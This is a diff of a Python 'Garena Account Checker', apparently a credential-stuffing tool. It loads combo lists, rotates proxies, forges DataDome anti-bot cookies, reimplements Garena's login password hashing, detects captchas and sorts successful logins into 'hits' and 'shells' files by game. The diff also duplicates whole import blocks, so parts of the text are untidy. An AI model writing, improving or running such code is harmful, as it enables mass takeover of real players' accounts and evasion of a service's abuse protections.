@@ -1,12 +1,3 @@
-#!/usr/bin/env python3
-# -*- coding: utf-8 -*-
-"""
-Hesu — Garena Account Checker
-Redesigned console UI · Hesu branding · by @dvlist
-"""
-from __future__ import annotations
-
-# ── Auto-install missing packages ────────────────────────────────────────────
 def _auto_install():
     import importlib, subprocess, sys
 
@@ -49,47 +40,64 @@ def _auto_install():
     print()
 
 _auto_install()
-# ─────────────────────────────────────────────────────────────────────────────
 
-import hashlib
-import json
-import logging
-import threading
-import random
-import os
-import re
-import sys
-import time
-import urllib.parse
-import signal
-import shutil
-import base64
-import socket
+import hashlib, json, logging, threading, random, os, re, sys, time, urllib.parse, signal, shutil, uuid, base64, io, socket
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from datetime import datetime
 from pathlib import Path
 from collections import deque
-from typing import Any, List, Optional, Dict, Tuple
-
+from threading import Lock, Event, Thread
 import colorama
 from colorama import Fore as _F, Style as _S
 import requests
 from Crypto.Cipher import AES
-
 from rich import print as rprint
 from rich.console import Console
+from rich.live import Live
 from rich.panel import Panel
-from rich.progress import (
-    BarColumn, MofNCompleteColumn, Progress,
-    SpinnerColumn, TextColumn, TimeElapsedColumn, TimeRemainingColumn,
-)
+from rich.progress import BarColumn, MofNCompleteColumn, Progress, SpinnerColumn, TextColumn, TimeElapsedColumn, TimeRemainingColumn
 from rich.table import Table
 from rich.text import Text
 from rich.box import Box, DOUBLE, HEAVY, ROUNDED
 from rich.columns import Columns
-from rich.align import Align
-from rich.padding import Padding
 from rich import box
+import hashlib, json, logging, threading, random, os, re, sys, time, urllib.parse, signal, shutil, uuid, base64, io, socket
+from concurrent.futures import ThreadPoolExecutor, as_completed
+from datetime import datetime
+from pathlib import Path
+from collections import deque
+from threading import Lock, Event, Thread
+import colorama
+from colorama import Fore as _F, Style as _S
+import requests
+from Crypto.Cipher import AES
+from rich import print as rprint
+from rich.console import Console
+from rich.live import Live
+from rich.panel import Panel
+from rich.progress import BarColumn, MofNCompleteColumn, Progress, SpinnerColumn, TextColumn, TimeElapsedColumn, TimeRemainingColumn
+from rich.table import Table
+from rich.text import Text
+from rich.box import Box, DOUBLE, HEAVY, ROUNDED
+from rich.columns import Columns
+from rich import box
+from rich.prompt import Confirm
+from rich.align import Align
+from rich.layout import Layout
+from rich.rule import Rule
+from rich.padding import Padding
+from typing import Any, List, Optional, Dict, Tuple
+from rich.prompt import Confirm
+from rich.align import Align
+from rich.layout import Layout
+from rich.rule import Rule
+from typing import Any, List, Optional, Dict, Tuple
+
+try:
+    import pyfiglet as _pyfiglet
+    _HAS_FIG = True
+except ImportError:
+    _HAS_FIG = False
 
 colorama.init(autoreset=True)
 
@@ -99,75 +107,69 @@ def _grad_char(ch, r1, g1, b1, r2, g2, b2, t):
     b = int(b1 + (b2 - b1) * t)
     return f'\033[38;2;{r};{g};{b}m{ch}\033[0m'
 
+
+
 def _grad_str(text, r1=180, g1=0, b1=255, r2=255, g2=80, b2=200):
     n = max(len(text) - 1, 1)
     return ''.join(_grad_char(ch, r1, g1, b1, r2, g2, b2, i / n) for i, ch in enumerate(text))
 
-_GRAD_VER = '\033[96m'   # warm gold (version)
-_GRAD_BY  = '\033[90m' # soft gray (by)
-_GRAD_AT  = '\033[38;5;139m'  # soft purple-gray
+
+
+_GRAD_VER = '\033[38;2;255;200;80m'
+_GRAD_BY  = '\033[38;2;160;160;160m'
+_GRAD_AT  = '\033[38;2;255;80;200m'
 
 
 console = Console()
 _shutil_ui = shutil
 
-# ── Hesu Neon palette ────────────────────────────────────────────────────
-# Primary: bright cyan · Brand accent: bright magenta · Success: neon green
-_CY  = _F.CYAN     + _S.BRIGHT   # primary
-_GN  = _F.GREEN    + _S.BRIGHT   # success
-_RD  = _F.RED      + _S.BRIGHT   # error
-_YL  = _F.YELLOW   + _S.BRIGHT   # warning
-_MG  = _F.MAGENTA  + _S.BRIGHT   # brand accent
-_WH  = _F.WHITE    + _S.BRIGHT   # text
-_BLU = _F.BLUE     + _S.BRIGHT   # info
-_PK  = "\033[38;5;213m"          # pink highlight
-_OR  = "\033[38;5;208m"          # orange highlight
+_CY = _F.CYAN + _S.BRIGHT
+_GN = _F.GREEN + _S.BRIGHT
+_RD = _F.RED + _S.BRIGHT
+_YL = _F.YELLOW + _S.BRIGHT
+_MG = _F.MAGENTA + _S.BRIGHT
+_WH = _F.WHITE + _S.BRIGHT
+_BLU = _F.BLUE + _S.BRIGHT
 _DIM = _S.DIM
 _RST = _S.RESET_ALL
 _BRT = _S.BRIGHT
 _ITL = "\033[3m"
-_SL  = "\033[38;5;245m"
-_GR  = "\033[38;5;117m"
-_GD  = "\033[38;5;222m"
-# Rich style strings (new theme: cyan primary, magenta brand)
-P  = 'bold cyan'
-S  = 'bold bright_cyan'
+_SL = "\033[38;5;240m"
+_GR = "\033[38;5;114m"
+_GD = "\033[38;5;222m"
+P = 'bold bright_magenta'
+S = 'bold bright_magenta'
 OK = 'bold bright_green'
 ER = 'bold bright_red'
 WN = 'bold yellow'
 MU = 'dim'
 TX = 'bright_white'
-BL = 'cyan'
+BL = 'magenta'
 
 def _tw():
     return _shutil_ui.get_terminal_size((80, 24)).columns
 
+
+
 def _w(n=72):
     return min(_tw() - 4, n)
 
+
+
 def _ts():
     return datetime.now().strftime('%H:%M:%S')
+
+
 
 def _visible_len(text):
     import re
     return len(re.sub(r'\x1b\[[0-9;]*m', '', str(text)))
 
+
+
 def _strip_rich(text):
     return re.sub('\\[/?[^\\]]+\\]', '', str(text))
 
-_LOG_ICONS = {
-    'INFO':     (_CY, 'ℹ'),
-    'SUCCESS':  (_GN, '✔'),
-    'WARNING':  (_YL, '⚠'),
-    'ERROR':    (_RD, '✖'),
-    'DEBUG':    (_DIM, '·'),
-    'REQUEST':  (_CY, '→'),
-    'RESPONSE': (_CY, '←'),
-    'RETRY':    (_YL, '↺'),
-    'PROXY':    (_MG, '⬡'),
-    'THREAD':   (_MG, '⧫'),
-    'SAVE':     (_GN, '⬇'),
-}
 
 
 def _log(level: str, msg: str, indent: str = '  '):
@@ -175,69 +177,23 @@ def _log(level: str, msg: str, indent: str = '  '):
     clean = _strip_rich(msg)
     print(f'{indent}{col}{icon}{_RST}  {clean}')
 
-def _prompt_box(body, title, border='bright_cyan', title_color=None,
-                box_style=None, indent=2):
-    """Rich Panel prompt — soft rounded/heavy box with per-section border color."""
-    from rich.panel import Panel
-    from rich.padding import Padding
-    from rich import box as _box
-    bs = box_style if box_style is not None else _box.ROUNDED
-    tc = title_color or border
-    console.print(Padding(
-        Panel(body,
-              title=f'[bold {tc}]{title}[/bold {tc}]',
-              border_style=border, box=bs, expand=False),
-        (0, 0, 0, indent)
-    ))
+
+
+_LOG_ICONS = {'INFO': (_CY, 'ℹ'), 'SUCCESS': (_GN, '✔'), 'WARNING': (_YL, '⚠'), 'ERROR': (_RD, '✖'), 'DEBUG': (_DIM, '·'), 'REQUEST': (_CY, '→'), 'RESPONSE': (_CY, '←'), 'RETRY': (_YL, '↺'), 'PROXY': (_MG, '⬡'), 'THREAD': (_MG, '⧫'), 'SAVE': (_GN, '⬇')}
 
 THREAD_CONFIGS = {'1': {'threads': 1, 'label': '1  thread   — Safe, slower', 'icon': ''}, '2': {'threads': 3, 'label': '3  threads  — Balanced', 'icon': ''}, '3': {'threads': 5, 'label': '5  threads  — Fast', 'icon': ''}, '4': {'threads': 10, 'label': '10 threads  — Very fast (risk)', 'icon': ''}, '5': {'threads': 15, 'label': '15 threads  — Max speed (high risk)', 'icon': ''}}
+from rich.box import Box, DOUBLE
 CARD = Box('┏━━┓\n┃  ┃\n┣━━┫\n┃  ┃\n┣━━┫\n┣━━┫\n┃  ┃\n┗━━┛\n')
 telegram_enabled = False
 _telegram_config = None
 
-# ── Nexora-style UI globals ──────────────────────────────────────────────
+# ── Nexora-style UI globals (Palitan ito) ──────────────────────────────
 HARVEST_COOKIES = False
 _BULK_MODE = 'full'                     # 'full' | 'semi' | 'none'
-_DISPLAY_MODE = 'dashboard'             # 'dashboard' | 'both'
 _scroll_lock = threading.Lock()
-_scroll_lines = deque(maxlen=500)
+_scroll_lines = deque(maxlen=10)         
 _dash_print_lock = threading.Lock()
 _active_dashboard = None
-
-def _raw_write(s: str):
-    """Write directly to the real terminal, bypassing colorama's wrapper.
-
-    colorama.init(autoreset=True) wraps sys.stdout with a StreamWrapper
-    that intercepts ANSI escape sequences. This is fine for color codes,
-    but it strips/breaks cursor-control and scroll-region sequences
-    (\x1b[1;Nr, \x1b[N;1H, \x1b[0J, etc.).
-
-    For terminal control sequences, we must write to the underlying stream.
-    """
-    stream = getattr(sys.stdout, '_StreamWrapper__wrapped', None)
-    if stream is None:
-        stream = getattr(sys.stdout, 'stream', None)
-    if stream is None:
-        stream = sys.stdout
-    try:
-        stream.write(s)
-    except Exception:
-        try:
-            sys.__stdout__.write(s)
-        except Exception:
-            pass
-
-def _raw_flush():
-    """Flush the underlying stream (bypassing colorama)."""
-    stream = getattr(sys.stdout, '_StreamWrapper__wrapped', None)
-    if stream is None:
-        stream = getattr(sys.stdout, 'stream', None)
-    if stream is None:
-        stream = sys.stdout
-    try:
-        stream.flush()
-    except Exception:
-        pass
 
 def _scroll_print(line: str):
     """Print a line above the fixed-bottom dashboard without disturbing it."""
@@ -245,7 +201,10 @@ def _scroll_print(line: str):
         _scroll_lines.append(line)
     sys.stdout.write(line + '\n')
     sys.stdout.flush()
+
+
 # ─────────────────────────────────────────────────────────────────────────
+
 
 CODM_REGIONS = {'AF':{'name':'Afghanistan','code':'93','flag':'🇦🇫'},'AL':{'name':'Albania','code':'355','flag':'🇦🇱'},'DZ':{'name':'Algeria','code':'213','flag':'🇩🇿'},'AD':{'name':'Andorra','code':'376','flag':'🇦🇩'},'AO':{'name':'Angola','code':'244','flag':'🇦🇴'},'AG':{'name':'Antigua and Barbuda','code':'1','flag':'🇦🇬'},'AR':{'name':'Argentina','code':'54','flag':'🇦🇷'},'AM':{'name':'Armenia','code':'374','flag':'🇦🇲'},'AU':{'name':'Australia','code':'61','flag':'🇦🇺'},'AT':{'name':'Austria','code':'43','flag':'🇦🇹'},'AZ':{'name':'Azerbaijan','code':'994','flag':'🇦🇿'},'BS':{'name':'Bahamas','code':'1','flag':'🇧🇸'},'BH':{'name':'Bahrain','code':'973','flag':'🇧🇭'},'BD':{'name':'Bangladesh','code':'880','flag':'🇧🇩'},'BB':{'name':'Barbados','code':'1','flag':'🇧🇧'},'BY':{'name':'Belarus','code':'375','flag':'🇧🇾'},'BE':{'name':'Belgium','code':'32','flag':'🇧🇪'},'BZ':{'name':'Belize','code':'501','flag':'🇧🇿'},'BJ':{'name':'Benin','code':'229','flag':'🇧🇯'},'BT':{'name':'Bhutan','code':'975','flag':'🇧🇹'},'BO':{'name':'Bolivia','code':'591','flag':'🇧🇴'},'BA':{'name':'Bosnia and Herzegovina','code':'387','flag':'🇧🇦'},'BW':{'name':'Botswana','code':'267','flag':'🇧🇼'},'BR':{'name':'Brazil','code':'55','flag':'🇧🇷'},'BN':{'name':'Brunei','code':'673','flag':'🇧🇳'},'BG':{'name':'Bulgaria','code':'359','flag':'🇧🇬'},'BF':{'name':'Burkina Faso','code':'226','flag':'🇧🇫'},'BI':{'name':'Burundi','code':'257','flag':'🇧🇮'},'KH':{'name':'Cambodia','code':'855','flag':'🇰🇭'},'CM':{'name':'Cameroon','code':'237','flag':'🇨🇲'},'CA':{'name':'Canada','code':'1','flag':'🇨🇦'},'CV':{'name':'Cape Verde','code':'238','flag':'🇨🇻'},'CF':{'name':'Central African Republic','code':'236','flag':'🇨🇫'},'TD':{'name':'Chad','code':'235','flag':'🇹🇩'},'CL':{'name':'Chile','code':'56','flag':'🇨🇱'},'CN':{'name':'China','code':'86','flag':'🇨🇳'},'CO':{'name':'Colombia','code':'57','flag':'🇨🇴'},'KM':{'name':'Comoros','code':'269','flag':'🇰🇲'},'CG':{'name':'Congo','code':'242','flag':'🇨🇬'},'CD':{'name':'Congo (DRC)','code':'243','flag':'🇨🇩'},'CR':{'name':'Costa Rica','code':'506','flag':'🇨🇷'},'CI':{'name':"Côte d'Ivoire",'code':'225','flag':'🇨🇮'},'HR':{'name':'Croatia','code':'385','flag':'🇭🇷'},'CU':{'name':'Cuba','code':'53','flag':'🇨🇺'},'CY':{'name':'Cyprus','code':'357','flag':'🇨🇾'},'CZ':{'name':'Czech Republic','code':'420','flag':'🇨🇿'},'DK':{'name':'Denmark','code':'45','flag':'🇩🇰'},'DJ':{'name':'Djibouti','code':'253','flag':'🇩🇯'},'DM':{'name':'Dominica','code':'1','flag':'🇩🇲'},'DO':{'name':'Dominican Republic','code':'1','flag':'🇩🇴'},'EC':{'name':'Ecuador','code':'593','flag':'🇪🇨'},'EG':{'name':'Egypt','code':'20','flag':'🇪🇬'},'SV':{'name':'El Salvador','code':'503','flag':'🇸🇻'},'GQ':{'name':'Equatorial Guinea','code':'240','flag':'🇬🇶'},'ER':{'name':'Eritrea','code':'291','flag':'🇪🇷'},'EE':{'name':'Estonia','code':'372','flag':'🇪🇪'},'SZ':{'name':'Eswatini','code':'268','flag':'🇸🇿'},'ET':{'name':'Ethiopia','code':'251','flag':'🇪🇹'},'FJ':{'name':'Fiji','code':'679','flag':'🇫🇯'},'FI':{'name':'Finland','code':'358','flag':'🇫🇮'},'FR':{'name':'France','code':'33','flag':'🇫🇷'},'GA':{'name':'Gabon','code':'241','flag':'🇬🇦'},'GM':{'name':'Gambia','code':'220','flag':'🇬🇲'},'GE':{'name':'Georgia','code':'995','flag':'🇬🇪'},'DE':{'name':'Germany','code':'49','flag':'🇩🇪'},'GH':{'name':'Ghana','code':'233','flag':'🇬🇭'},'GR':{'name':'Greece','code':'30','flag':'🇬🇷'},'GD':{'name':'Grenada','code':'1','flag':'🇬🇩'},'GT':{'name':'Guatemala','code':'502','flag':'🇬🇹'},'GN':{'name':'Guinea','code':'224','flag':'🇬🇳'},'GW':{'name':'Guinea-Bissau','code':'245','flag':'🇬🇼'},'GY':{'name':'Guyana','code':'592','flag':'🇬🇾'},'HT':{'name':'Haiti','code':'509','flag':'🇭🇹'},'HN':{'name':'Honduras','code':'504','flag':'🇭🇳'},'HK':{'name':'Hong Kong','code':'852','flag':'🇭🇰'},'HU':{'name':'Hungary','code':'36','flag':'🇭🇺'},'IS':{'name':'Iceland','code':'354','flag':'🇮🇸'},'IN':{'name':'India','code':'91','flag':'🇮🇳'},'ID':{'name':'Indonesia','code':'62','flag':'🇮🇩'},'IR':{'name':'Iran','code':'98','flag':'🇮🇷'},'IQ':{'name':'Iraq','code':'964','flag':'🇮🇶'},'IE':{'name':'Ireland','code':'353','flag':'🇮🇪'},'IL':{'name':'Israel','code':'972','flag':'🇮🇱'},'IT':{'name':'Italy','code':'39','flag':'🇮🇹'},'JM':{'name':'Jamaica','code':'1','flag':'🇯🇲'},'JP':{'name':'Japan','code':'81','flag':'🇯🇵'},'JO':{'name':'Jordan','code':'962','flag':'🇯🇴'},'KZ':{'name':'Kazakhstan','code':'7','flag':'🇰🇿'},'KE':{'name':'Kenya','code':'254','flag':'🇰🇪'},'KI':{'name':'Kiribati','code':'686','flag':'🇰🇮'},'KR':{'name':'South Korea','code':'82','flag':'🇰🇷'},'KW':{'name':'Kuwait','code':'965','flag':'🇰🇼'},'KG':{'name':'Kyrgyzstan','code':'996','flag':'🇰🇬'},'LA':{'name':'Laos','code':'856','flag':'🇱🇦'},'LV':{'name':'Latvia','code':'371','flag':'🇱🇻'},'LB':{'name':'Lebanon','code':'961','flag':'🇱🇧'},'LS':{'name':'Lesotho','code':'266','flag':'🇱🇸'},'LR':{'name':'Liberia','code':'231','flag':'🇱🇷'},'LY':{'name':'Libya','code':'218','flag':'🇱🇾'},'LI':{'name':'Liechtenstein','code':'423','flag':'🇱🇮'},'LT':{'name':'Lithuania','code':'370','flag':'🇱🇹'},'LU':{'name':'Luxembourg','code':'352','flag':'🇱🇺'},'MO':{'name':'Macau','code':'853','flag':'🇲🇴'},'MG':{'name':'Madagascar','code':'261','flag':'🇲🇬'},'MW':{'name':'Malawi','code':'265','flag':'🇲🇼'},'MY':{'name':'Malaysia','code':'60','flag':'🇲🇾'},'MV':{'name':'Maldives','code':'960','flag':'🇲🇻'},'ML':{'name':'Mali','code':'223','flag':'🇲🇱'},'MT':{'name':'Malta','code':'356','flag':'🇲🇹'},'MH':{'name':'Marshall Islands','code':'692','flag':'🇲🇭'},'MR':{'name':'Mauritania','code':'222','flag':'🇲🇷'},'MU':{'name':'Mauritius','code':'230','flag':'🇲🇺'},'MX':{'name':'Mexico','code':'52','flag':'🇲🇽'},'FM':{'name':'Micronesia','code':'691','flag':'🇫🇲'},'MD':{'name':'Moldova','code':'373','flag':'🇲🇩'},'MC':{'name':'Monaco','code':'377','flag':'🇲🇨'},'MN':{'name':'Mongolia','code':'976','flag':'🇲🇳'},'ME':{'name':'Montenegro','code':'382','flag':'🇲🇪'},'MA':{'name':'Morocco','code':'212','flag':'🇲🇦'},'MZ':{'name':'Mozambique','code':'258','flag':'🇲🇿'},'MM':{'name':'Myanmar','code':'95','flag':'🇲🇲'},'NA':{'name':'Namibia','code':'264','flag':'🇳🇦'},'NR':{'name':'Nauru','code':'674','flag':'🇳🇷'},'NP':{'name':'Nepal','code':'977','flag':'🇳🇵'},'NL':{'name':'Netherlands','code':'31','flag':'🇳🇱'},'NZ':{'name':'New Zealand','code':'64','flag':'🇳🇿'},'NI':{'name':'Nicaragua','code':'505','flag':'🇳🇮'},'NE':{'name':'Niger','code':'227','flag':'🇳🇪'},'NG':{'name':'Nigeria','code':'234','flag':'🇳🇬'},'MK':{'name':'North Macedonia','code':'389','flag':'🇲🇰'},'NO':{'name':'Norway','code':'47','flag':'🇳🇴'},'OM':{'name':'Oman','code':'968','flag':'🇴🇲'},'PK':{'name':'Pakistan','code':'92','flag':'🇵🇰'},'PW':{'name':'Palau','code':'680','flag':'🇵🇼'},'PA':{'name':'Panama','code':'507','flag':'🇵🇦'},'PG':{'name':'Papua New Guinea','code':'675','flag':'🇵🇬'},'PY':{'name':'Paraguay','code':'595','flag':'🇵🇾'},'PE':{'name':'Peru','code':'51','flag':'🇵🇪'},'PH':{'name':'Philippines','code':'63','flag':'🇵🇭'},'PL':{'name':'Poland','code':'48','flag':'🇵🇱'},'PT':{'name':'Portugal','code':'351','flag':'🇵🇹'},'QA':{'name':'Qatar','code':'974','flag':'🇶🇦'},'RO':{'name':'Romania','code':'40','flag':'🇷🇴'},'RU':{'name':'Russia','code':'7','flag':'🇷🇺'},'RW':{'name':'Rwanda','code':'250','flag':'🇷🇼'},'KN':{'name':'Saint Kitts and Nevis','code':'1','flag':'🇰🇳'},'LC':{'name':'Saint Lucia','code':'1','flag':'🇱🇨'},'VC':{'name':'Saint Vincent and the Grenadines','code':'1','flag':'🇻🇨'},'WS':{'name':'Samoa','code':'685','flag':'🇼🇸'},'SM':{'name':'San Marino','code':'378','flag':'🇸🇲'},'ST':{'name':'São Tomé and Príncipe','code':'239','flag':'🇸🇹'},'SA':{'name':'Saudi Arabia','code':'966','flag':'🇸🇦'},'SN':{'name':'Senegal','code':'221','flag':'🇸🇳'},'RS':{'name':'Serbia','code':'381','flag':'🇷🇸'},'SC':{'name':'Seychelles','code':'248','flag':'🇸🇨'},'SL':{'name':'Sierra Leone','code':'232','flag':'🇸🇱'},'SG':{'name':'Singapore','code':'65','flag':'🇸🇬'},'SK':{'name':'Slovakia','code':'421','flag':'🇸🇰'},'SI':{'name':'Slovenia','code':'386','flag':'🇸🇮'},'SB':{'name':'Solomon Islands','code':'677','flag':'🇸🇧'},'SO':{'name':'Somalia','code':'252','flag':'🇸🇴'},'ZA':{'name':'South Africa','code':'27','flag':'🇿🇦'},'SS':{'name':'South Sudan','code':'211','flag':'🇸🇸'},'ES':{'name':'Spain','code':'34','flag':'🇪🇸'},'LK':{'name':'Sri Lanka','code':'94','flag':'🇱🇰'},'SD':{'name':'Sudan','code':'249','flag':'🇸🇩'},'SR':{'name':'Suriname','code':'597','flag':'🇸🇷'},'SE':{'name':'Sweden','code':'46','flag':'🇸🇪'},'CH':{'name':'Switzerland','code':'41','flag':'🇨🇭'},'SY':{'name':'Syria','code':'963','flag':'🇸🇾'},'TW':{'name':'Taiwan','code':'886','flag':'🇹🇼'},'TJ':{'name':'Tajikistan','code':'992','flag':'🇹🇯'},'TZ':{'name':'Tanzania','code':'255','flag':'🇹🇿'},'TH':{'name':'Thailand','code':'66','flag':'🇹🇭'},'TL':{'name':'Timor-Leste','code':'670','flag':'🇹🇱'},'TG':{'name':'Togo','code':'228','flag':'🇹🇬'},'TO':{'name':'Tonga','code':'676','flag':'🇹🇴'},'TT':{'name':'Trinidad and Tobago','code':'1','flag':'🇹🇹'},'TN':{'name':'Tunisia','code':'216','flag':'🇹🇳'},'TR':{'name':'Turkey','code':'90','flag':'🇹🇷'},'TM':{'name':'Turkmenistan','code':'993','flag':'🇹🇲'},'TV':{'name':'Tuvalu','code':'688','flag':'🇹🇻'},'UG':{'name':'Uganda','code':'256','flag':'🇺🇬'},'UA':{'name':'Ukraine','code':'380','flag':'🇺🇦'},'AE':{'name':'United Arab Emirates','code':'971','flag':'🇦🇪'},'GB':{'name':'United Kingdom','code':'44','flag':'🇬🇧'},'US':{'name':'United States','code':'1','flag':'🇺🇸'},'UY':{'name':'Uruguay','code':'598','flag':'🇺🇾'},'UZ':{'name':'Uzbekistan','code':'998','flag':'🇺🇿'},'VU':{'name':'Vanuatu','code':'678','flag':'🇻🇺'},'VA':{'name':'Vatican City','code':'39','flag':'🇻🇦'},'VE':{'name':'Venezuela','code':'58','flag':'🇻🇪'},'VN':{'name':'Vietnam','code':'84','flag':'🇻🇳'},'YE':{'name':'Yemen','code':'967','flag':'🇾🇪'},'ZM':{'name':'Zambia','code':'260','flag':'🇿🇲'},'ZW':{'name':'Zimbabwe','code':'263','flag':'🇿🇼'}}
 
@@ -261,20 +220,6 @@ def _make_session(pool_size=1000):
     s.mount('https://', adapter)
     return s
 
-
-_codm_tls = threading.local()
-
-def _get_codm_session():
-    """Per-thread keep-alive session for the CODM sub-check.
-
-    Reused across accounts so the TLS connection to the CODM/SSO hosts stays
-    warm instead of a fresh handshake on every valid hit.
-    """
-    s = getattr(_codm_tls, 'session', None)
-    if s is None:
-        s = _make_session(pool_size=4)
-        _codm_tls.session = s
-    return s
 
 
 def sanitize_string(text):
@@ -374,17 +319,34 @@ logger.setLevel(logging.INFO)
 logging.getLogger('urllib3').setLevel(logging.ERROR)
 logging.getLogger('requests').setLevel(logging.ERROR)
 
-DEFAULT_THREADS = 30
+DEFAULT_THREADS = 50
 CHECK_OTHER_GAMES: bool = False
 GAME_FILE_MAP = {'CODM': 'CODM.txt', 'FREEFIRE': 'FreeFire.txt', 'FREE FIRE': 'FreeFire.txt', 'ROV': 'ROV.txt', 'DELTA FORCE': 'DeltaForce.txt', 'AOV': 'AOV.txt', 'SPEED DRIFTERS': 'SpeedDrifters.txt', 'BLACK CLOVER M': 'BlackCloverM.txt', 'GARENA UNDAWN': 'Undawn.txt', 'FC ONLINE': 'FCOnline.txt', 'FC ONLINE M': 'FCOnlineM.txt', 'MOONLIGHT BLADE': 'MoonlightBlade.txt', 'FAST THRILL': 'FastThrill.txt', 'THE WORLD OF WAR': 'WorldOfWar.txt'}
 GAME_DISPLAY_NAMES = [('CODM', 'CODM'), ('FREEFIRE', 'Free Fire'), ('ROV', 'ROV'), ('DELTA FORCE', 'Delta Force'), ('AOV', 'AOV'), ('SPEED DRIFTERS', 'Speed Drifters'), ('BLACK CLOVER M', 'Black Clover M'), ('GARENA UNDAWN', 'Undawn'), ('FC ONLINE', 'FC Online'), ('FC ONLINE M', 'FC Online M'), ('MOONLIGHT BLADE', 'Moonlight Blade'), ('FAST THRILL', 'Fast Thrill'), ('THE WORLD OF WAR', 'World of War')]
 OAUTH_MAX_RETRIES = 3
-OAUTH_RETRY_DELAY = 0.3
+OAUTH_RETRY_DELAY = 2
 
 MSDK_UA = (
     "Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/144.0.7559.59 Mobile Safari/537.36; GarenaMSDK/5.12.1(Lenovo TB-9707F ;Android 15;en;us;)"
 )
 MSDK_SEC_CH_UA = '"Not(A:Brand";v="8", "Chromium";v="144", "Android WebView";v="144"'
+
+def load_proxies(filename='proxies_2.txt'):
+  proxies_list = []
+  try:
+    with open(filename, 'r', encoding='utf-8') as f:
+      for line in f:
+        proxy = line.strip()
+        if proxy and not proxy.startswith('#'):
+          proxies_list.append(proxy)
+    print(f'[+] Loaded {len(proxies_list)} proxies successfully.')
+  except FileNotFoundError:
+    pass
+  return proxies_list
+
+
+GLOBAL_PROXIES = load_proxies('proxies_2.txt')
+
 
 class AccountFileManager:
 
@@ -471,6 +433,16 @@ class AccountFileManager:
             logger.error(f'Error removing line')
             return False
 
+
+
+from rich.console import Console
+from rich.table import Table
+from rich.panel import Panel
+from rich.text import Text
+from rich.live import Live
+from rich import box
+import time
+
 class AccountFileViewer:
     def __init__(self):
         self.console = Console()
@@ -541,6 +513,8 @@ class AccountFileViewer:
         return self._ask_panel(
             '[white]Auto-remove checked lines? [dim](y/N)[/dim][/white]',
             '❯ Auto-Remove', 'bright_yellow', '93') == 'y'
+
+
 
 class LiveStats:
     def __init__(self):
@@ -760,6 +734,12 @@ class LiveStats:
         footer_text.append("◈  Powered by @dvlist", style="bold cyan")
         console.print(Panel(Align.center(footer_text), border_style="cyan", box=ROUNDED, padding=(0, 1)))
         console.print()
+
+
+
+import sys
+import time
+import threading
 
 class BulkLiveDashboard:
     """Live dashboard — cursor-up erase-and-redraw (works on Android/Termux).
@@ -1305,6 +1285,8 @@ class BulkLiveDashboard:
         lines.append('')
         return '\n'.join(lines)
 
+
+
 class ResultsManager:
     def __init__(self, combo_file_path, create_dirs=True):
         self.combo_file_name = Path(combo_file_path).stem
@@ -1482,6 +1464,8 @@ class ResultsManager:
         if shell > 0:
             self._write_sorted(self.base_dir / 'Garena Shells' / 'CODM Shells.txt', entry, sort_by='shell')
 
+
+
 _SCRIPT_DIR_COOKIE = os.path.dirname(os.path.abspath(__file__))
 _TG_HOOK = None
 
@@ -1497,6 +1481,7 @@ _DATADOME_SEED_LOCK = threading.Lock()
 _DATADOME_SEED_IDX = {'i': 0}
 
 _SEEDS_FILE = 'seeds.txt'
+
 
 
 def _load_datadome_seeds():
@@ -1534,8 +1519,6 @@ def _next_datadome_seed():
         i = _DATADOME_SEED_IDX['i']
         _DATADOME_SEED_IDX['i'] = (i + 1) % len(_DATADOME_SEEDS)
         return _DATADOME_SEEDS[i]
-
-
 _SESSION_MAX_AGE_SECONDS = 6 * 3600
 
 _SESSION_USES_PER_COOKIE = 10
@@ -1608,7 +1591,6 @@ def _get_any_session():
         _CURRENT_SESSION_USES = 1
         _SESSION_POOL_INDEX  += 1
         return _CURRENT_SESSION
-
 
 def _get_session_for(account):
     return _get_any_session()
@@ -1702,7 +1684,6 @@ class ProxyManager:
     def get_count(self):
         return len(self.proxies)
 
-
 def extract_datadome_token(cookie_str):
     if not cookie_str:
         return ''
@@ -1716,7 +1697,6 @@ def extract_datadome_token(cookie_str):
     if val.startswith('datadome='):
         return val.split('=', 1)[1].strip()
     return val
-
 
 class CookieManager:
 
@@ -1804,7 +1784,6 @@ class CookieManager:
         except Exception:
             pass
 
-
 def encode(plaintext, key):
     key = bytes.fromhex(key)
     plaintext = bytes.fromhex(plaintext)
@@ -1812,18 +1791,15 @@ def encode(plaintext, key):
     ciphertext = cipher.encrypt(plaintext)
     return ciphertext.hex()[:32]
 
-
 def get_passmd5(password):
     decoded_password = urllib.parse.unquote(password)
     return hashlib.md5(decoded_password.encode('utf-8')).hexdigest()
-
 
 def hash_password(password, v1, v2):
     passmd5 = get_passmd5(password)
     inner_hash = hashlib.sha256((passmd5 + v1).encode()).hexdigest()
     outer_hash = hashlib.sha256((inner_hash + v2).encode()).hexdigest()
     return encode(passmd5, outer_hash)
-
 
 def applyck(session, cookie_str):
     session.cookies.clear()
@@ -1864,7 +1840,6 @@ def applyck(session, cookie_str):
         else:
             session.cookies.set(k, v, domain='.garena.com')
 
-
 _ip_wait_lock = threading.Lock()
 _ip_wait_active = False
 _ip_wait_event = threading.Event()
@@ -1874,7 +1849,6 @@ _ip_block_callback = None
 def _save_session_cookies(session):
     return False
 
-
 def init_ga_cookies(session):
     timestamp = int(time.time())
     random_id = random.randint(1000000000, 9999999999)
@@ -1882,7 +1856,6 @@ def init_ga_cookies(session):
     for name, value in ga_cookies.items():
         session.cookies.set(name, value, domain='.garena.com')
     return ga_cookies
-
 
 class DataDomeGenerator:
 
@@ -1993,7 +1966,6 @@ class DataDomeGenerator:
         if padding > 0:
             return ''.join(result_chars[:-(3 - padding)])
         return ''.join(result_chars)
-
 
 class DataDomeManager:
     def __init__(self):
@@ -2167,7 +2139,6 @@ class DataDomeManager:
                 return False
         return False
 
-
 def get_datadome_cookie(session, proxies=None):
     url = 'https://datadome.garena.com/js/'
     headers = {
@@ -2214,9 +2185,7 @@ def get_datadome_cookie(session, proxies=None):
         pass
     return None
 
-
 _CAPTCHA_MARKERS = (b'<html', b'<!doctype', b'datadome', b'interstitial', b'captcha', b'robot', b'blocked')
-_FAKE_CHECK_BYTES = 200  # was 400 — 200 is enough to detect HTML/captcha markers
 
 def _is_fake_response(response):
     ct = response.headers.get('content-type', '').lower()
@@ -2227,7 +2196,6 @@ def _is_fake_response(response):
         if marker in raw:
             return True
     return False
-
 
 def prelogin(session, account, datadome_manager, cookie_manager, retries=6, proxy_manager=None):
     all_403 = True
